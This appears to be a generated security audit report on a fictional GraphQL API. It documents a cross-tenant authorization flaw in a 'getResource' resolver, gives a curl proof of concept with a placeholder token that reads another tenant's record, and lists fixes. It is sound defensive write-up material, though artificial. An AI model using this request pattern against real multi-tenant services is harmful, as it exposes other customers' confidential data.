# Security Analysis Report
**System:** ReactorCore Safety API
**Domain:** Nuclear / Safety Systems
**Example ID:** GQL-0290
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.5 | Multi-tenant cross-tenant access on `getResource` — attacker from `tenant-b87b` reads nuclear safety records owned by `tenant-a92a` |

---

## Finding 1 — BOLA: Multi-Tenant Cross-Tenant Access (Pattern 1.5)

### Summary
The `getResource` resolver on ReactorCore Safety API (`api.reactorcore-safety-a.example.com`) fetches by `resourceId` only. The resolver does NOT verify that the fetched object's `tenantId` matches the JWT's `tenantId` claim (§4.0). Per §5.0 Pattern 1.5, an attacker with a valid JWT for `tenant-b87b` supplies a `resourceId` belonging to `tenant-a92a` and receives the full sensitive record. The Redis cache is keyed by `resourceId` only (no tenant dimension), amplifying the risk.

**Note:** HAR request operation (`getResource`) and response JSON key (`getResource`) are consistent.
**Note on `x-request-id`:** This appears as a *response* header (`"x-request-id": "req-b87ba92a"`). It is server-assigned and must NOT be sent as a request header.

**Pattern:** 1.5 — Multi-tenant / cross-tenant access (BOLA)
**Affected resolver:** `getResource`
**Affected endpoint:** `POST https://api.reactorcore-safety-a.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (attacker JWT: `tenant-b87b`)**
```
POST https://api.reactorcore-safety-a.example.com/graphql
authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
content-type: application/json
x-tenant-id: tenant-b87b

{"query": "query VulnerableOp { getResource(id: \"R-2290\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}
```

**Response — Cross-Tenant Nuclear Safety Record Returned**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-a92a",
      "ownerId": "other-user-b87ba92a",
      "data": {
        "sensitiveField": "CONFIDENTIAL-b87ba92a",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
*`x-request-id: req-b87ba92a` — server-assigned response header, confirms cross-tenant access.*

### Steps to Reproduce
```bash
curl -s -X POST "https://api.reactorcore-safety-a.example.com/graphql" \
  -H "authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "content-type: application/json" \
  -H "x-tenant-id: tenant-b87b" \
  -d '{"query": "query VulnerableOp { getResource(id: \"R-2290\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
# Vulnerable: tenantId: tenant-a92a returned for tenant-b87b caller
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. In `getResource` resolver: `if (resource.tenantId !== jwt.tenantId) throw new ForbiddenError()`
2. Key Redis cache on `tenantId:resourceId` composite, not `resourceId` alone.
3. Apply row-level security policy: `WHERE tenant_id = $jwt_tenant_id`.
